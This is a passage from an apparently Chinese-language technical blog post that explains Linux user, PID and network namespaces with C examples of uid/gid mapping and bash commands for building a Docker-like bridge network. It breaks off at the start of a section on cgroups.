class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_map</span><span class="params">(<span class="keyword">char</span>* file, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    FILE* mapfd = fopen(file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == mapfd) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open file error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(mapfd, <span class="string">&quot;%d %d %d&quot;</span>, inside_id, outside_id, len);</span><br><span class="line">    fclose(mapfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_uid_map</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> file[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(file, <span class="string">&quot;/proc/%d/uid_map&quot;</span>, pid);</span><br><span class="line">    set_map(file, inside_id, outside_id, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_gid_map</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> file[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(file, <span class="string">&quot;/proc/%d/gid_map&quot;</span>, pid);</span><br><span class="line">    set_map(file, inside_id, outside_id, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">            (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 等待父进程通知后再往下执行（进程间的同步） */</span></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line">    read(pipefd[<span class="number">0</span>], &amp;ch, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - setup hostname!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="comment">//set hostname</span></span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information</span></span><br><span class="line">    mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> gid=getgid(), uid=getuid();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">            (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    pipe(pipefd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - start a container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, </span><br><span class="line">            CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - Container [%5d]!\n&quot;</span>, getpid(), container_pid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//To map the uid/gid, </span></span><br><span class="line">    <span class="comment">//   we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent</span></span><br><span class="line">    <span class="comment">//The file format is</span></span><br><span class="line">    <span class="comment">//   ID-inside-ns   ID-outside-ns   length</span></span><br><span class="line">    <span class="comment">//if no mapping, </span></span><br><span class="line">    <span class="comment">//   the uid will be taken from /proc/sys/kernel/overflowuid</span></span><br><span class="line">    <span class="comment">//   the gid will be taken from /proc/sys/kernel/overflowgid</span></span><br><span class="line">    set_uid_map(container_pid, <span class="number">0</span>, uid, <span class="number">1</span>);</span><br><span class="line">    set_gid_map(container_pid, <span class="number">0</span>, gid, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - user/group mapping done!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 通知子进程 */</span></span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写入/proc/<pid>/uid_map(gid_map)文件的进程需要这个namespace中的CAP_SETUID (CAP_SETGID)权限，写入的进程必须是此user namespace的父或子的user namespace进程<br>我这编译了 gid 映射文件没成功写入，原因可参考 <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/user_namespaces.7.html">https://man7.org/linux/man-pages/man7/user_namespaces.7.html</a></p>
<blockquote>
<p>/*<br>Linux 3.19 made a change in the handling of setgroups(2) and the<br>‘gid_map’ file to address a security issue. The issue allowed<br><em>unprivileged</em> users to employ user namespaces in order to drop<br>The upshot of the 3.19 changes is that in order to update the<br>‘gid_maps’ file, use of the setgroups() system call in this<br>user namespace must first be disabled by writing “deny” to one of<br>the /proc/PID/setgroups files for this namespace. That is the<br>purpose of the following function.<br>*/</p>
</blockquote>
<p>其实上述代码还涉及进程间同步问题，即有管道代码位置有点问题，有时会出现还未修改 /proc/<pid>/uid_map(gid_map) 就已经获取了容器内的 uid 和 gid ，这里通过另外一种方式实现，解决进程同步问题，顺便设置了 setgroups</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/usr/bin/sh&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_envp[] = &#123;</span><br><span class="line">    <span class="string">&quot;PATH=/usr/bin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TERM=console&quot;</span>,</span><br><span class="line">    <span class="string">&quot;HOME=/root&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_groups</span><span class="params">(<span class="keyword">char</span>* file, <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">    FILE* groupfd = fopen(file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == groupfd) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open file error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(groupfd, <span class="string">&quot;%s&quot;</span>, value);</span><br><span class="line">    fclose(groupfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_map</span><span class="params">(<span class="keyword">char</span>* file, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    FILE* mapfd = fopen(file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == mapfd) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open file error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(mapfd, <span class="string">&quot;%d %d %d&quot;</span>, inside_id, outside_id, len);</span><br><span class="line">    fclose(mapfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">    (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - setup hostname!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="comment">//set hostname</span></span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set root directory</span></span><br><span class="line">    chroot(<span class="string">&quot;rootfs&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change to `/`</span></span><br><span class="line">    chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information</span></span><br><span class="line">    mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    execvpe(container_args[<span class="number">0</span>], container_args, container_envp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> gid=getegid(), uid=geteuid();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">    (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - start a container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> container_pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!container_pid) &#123;</span><br><span class="line">        <span class="comment">/* since Linux 3.19 unprivileged writing of /proc/self/gid_map</span></span><br><span class="line"><span class="comment">        * has s been disabled unless /proc/self/setgroups is written</span></span><br><span class="line"><span class="comment">        * first to permanently disable the ability to call setgroups</span></span><br><span class="line"><span class="comment">        * in that user namespace. */</span></span><br><span class="line">        set_groups(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line">        <span class="comment">//To map the uid/gid,</span></span><br><span class="line">        <span class="comment">// we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent</span></span><br><span class="line">        <span class="comment">//The file format is</span></span><br><span class="line">        <span class="comment">// ID-inside-ns ID-outside-ns length</span></span><br><span class="line">        <span class="comment">//if no mapping,</span></span><br><span class="line">        <span class="comment">// the uid will be taken from /proc/sys/kernel/overflowuid</span></span><br><span class="line">        <span class="comment">// the gid will be taken from /proc/sys/kernel/overflowgid</span></span><br><span class="line">        set_map(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="number">0</span>, uid, <span class="number">1</span>);</span><br><span class="line">        set_map(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="number">0</span>, gid, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> container_main(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - Container [%5d]!\n&quot;</span>, getpid(), container_pid);</span><br><span class="line"></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - container stopped!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了下这部分代码，发现和 Docker 的 nsexec.c 有几分相像</p>
<p>或者还有些疑问，因为这个是非 root 权限就可以设置的标志位，对于需要 root 权限的标志位，一般用户先创建User Namespace，然后把这个用户映射成root，在容器内用root来创建其它的Namesapce</p>
<h3 id="Network-Namespace"><a href="#Network-Namespace" class="headerlink" title="Network Namespace"></a>Network Namespace</h3><p>与上面几种Namespace一样，通过设置标志位 <code>CLONE_NEWNET</code> 即可实现网络隔离，比如 nc 监听 80 端口，并不会占用宿主机的端口</p>
<p>到这里，需要隔离的已经隔离的差不多了，为了更加直观的演示，下面通过命令模仿Docker中的网络命名空间</p>
<p>Docker 在宿主机上的网络示意图</p>
<p><img src="/img/linux-namespace/fedf67449ac0090f1845503f7a40e6526649a5d5.png" class="lazyload" data-srcset="/img/linux-namespace/fedf67449ac0090f1845503f7a40e6526649a5d5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5568"></p>
<p>在虚拟机上查看网络情况 <code>ip link</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:3f:89:83 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">7: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default</span><br><span class="line">    link/ether 02:42:a3:2f:a2:a2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">17: veth706734a@if16: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP mode DEFAULT group default</span><br><span class="line">    link/ether f6:59:f6:3a:5b:68 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br></pre></td></tr></table></figure>

<p>ip命令自带网络空间隔离功能，我们可以通过如下命令来做一个Docker桥接网络</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 先增加一个网桥lxcbr0，模仿docker0</span></span><br><span class="line">brctl addbr lxcbr0</span><br><span class="line">brctl stp lxcbr0 off</span><br><span class="line"><span class="comment"># 为网桥设置IP地址</span></span><br><span class="line">ip addr add 192.168.10.1/24 dev lxcbr0 </span><br><span class="line">ip link <span class="built_in">set</span> dev lxcbr0 up</span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建一个 network namespace - ns1</span></span><br><span class="line"><span class="comment"># 增加一个 namesapce 命令为 ns1</span></span><br><span class="line">ip netns add ns1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活namespace中的loopback，即127.0.0.1（使用ip netns exec ns1来操作ns1中的命令）</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip link <span class="built_in">set</span> dev lo up </span><br><span class="line"></span><br><span class="line"><span class="comment">## 然后，我们需要增加一对虚拟网卡</span></span><br><span class="line"><span class="comment"># 增加一个对虚拟网卡，注意其中的veth类型，其中一个网卡要放到容器（命名空间）中</span></span><br><span class="line">ip link add veth-ns1 <span class="built_in">type</span> veth peer name lxcbr0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把 veth-ns1 放入 namespace ns1中，这样容器中就会有一个新的网卡了，并且宿主机的 veth-ns1 网卡会消失</span></span><br><span class="line">ip link <span class="built_in">set</span> veth-ns1 netns ns1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把容器里的 veth-ns1改名为 eth0 （容器外会冲突，容器内就不会了）</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1  ip link <span class="built_in">set</span> dev veth-ns1 name eth0 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 为容器中的网卡分配一个IP地址，并激活它</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip addr add 192.168.10.11/24 dev eth0</span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip link <span class="built_in">set</span> dev eth0 up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面我们把veth-ns1这个网卡放入容器中，这里我们把lxcbr0.1添加上网桥上</span></span><br><span class="line">brctl addif lxcbr0 lxcbr0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这步激活不能忘了, 否则会因 lxcbr0 网桥这边的 veth 为启用导致命名空间内检测不到另外一端</span></span><br><span class="line"><span class="comment"># 谢谢向磊哥帮忙看了下，一开始没加这句，导致网络一直不通，自己排查了挺久没发现</span></span><br><span class="line">ip link <span class="built_in">set</span> dev lxcbr0.1 up</span><br></pre></td></tr></table></figure>

<p>可以通过 <code>brctl show</code> 命令查看网桥接入的网卡情况，并且可以通过执行 <code>ip netns exec ns1 ping 192.168.10.1</code> 测试命名空间内的网络是否与lxcbr0网桥正常通信</p>
<p>要想容器内访问外部网络，需要添加路由，需要域名解析需要添加dns解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为容器增加一个路由规则，让容器可以访问外面的网络</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip route add default via 192.168.10.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/etc/netns下创建network namespce名称为ns1的目录，</span></span><br><span class="line"><span class="comment"># 然后为这个namespace设置resolv.conf，这样，容器内就可以访问域名了</span></span><br><span class="line">mkdir -p /etc/netns/ns1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> &gt; /etc/netns/ns1/resolv.conf</span><br></pre></td></tr></table></figure>

<p>如果在虚拟机内还需要设置网卡为混杂模式</p>
<h3 id="CGroups-Namespace-15"><a href="#CGroups-Namespace-15" class="headerlink" title="CGroups Namespace[15]"></a>CGroups Namespace<sup>[15]</sup></h3><p>推荐阅读 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000006917884">Cgroup概述</a><sup>[16]</sup></p>
<blockquote>
<p>cgroup是Linux下的一种将进程按组进行管理的机制，在用户层看来，cgroup技术就是把系统中的所有进程组织成一颗一颗独立的树，每棵树都包含系统的所有进程，树的每个节点是一个进程组，而每颗树又和一个或者多个subsystem关联，树的作用是将进程分组，而subsystem的作用就是对这些组进行操作</p>
</blockquote>
<p>cgroups (control groups) 主要包括 subsystem 和 hierarchy 两部分</p>
<p>1个subsystem就是一个内核模块，目前Linux支持下面12种subsystem</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=iZbezHRFyj6bg1d/E2WmVg==.QzwzZwFrk1EUxvpbLRE1wE0cnmEl3padAEwCxP1vaoNdULT5LDjbBD4xtMbNOrq9zShS8ZuXYhVDb2Gvg6a4sqyWwYP5yfY5pcfGs+EG+rI=">cpu</a> (since Linux 2.6.24; CONFIG_CGROUP_SCHED)<br>用来限制cgroup的CPU使用率。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=XZNdbnGe4XiDvxdzTXvOog==.IYfJ6NauHBhNr0EWOfbs3/cGpDOe33d6Yu1+aT68qXioIUtDuF6AcTikdCQCo3XvkM4G4biqhEnRMjWv8F9Djw==">cpuacct</a> (since Linux 2.6.24; CONFIG_CGROUP_CPUACCT)<br>统计cgroup的CPU的使用率。</li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=mLjiP7srCfGvFIfxdbg0OA==.wlroTp3re+Cfqy1LVkwn67DQMj6vn7+ki28CitTS/4Pd8kbxWbHA5uxUujUZfpukB9cKNeeIT4T/T8+eMRVZDw==">cpuset</a> (since Linux 2.6.24; CONFIG_CPUSETS)<br>绑定cgroup到指定CPUs和NUMA节点。</li>
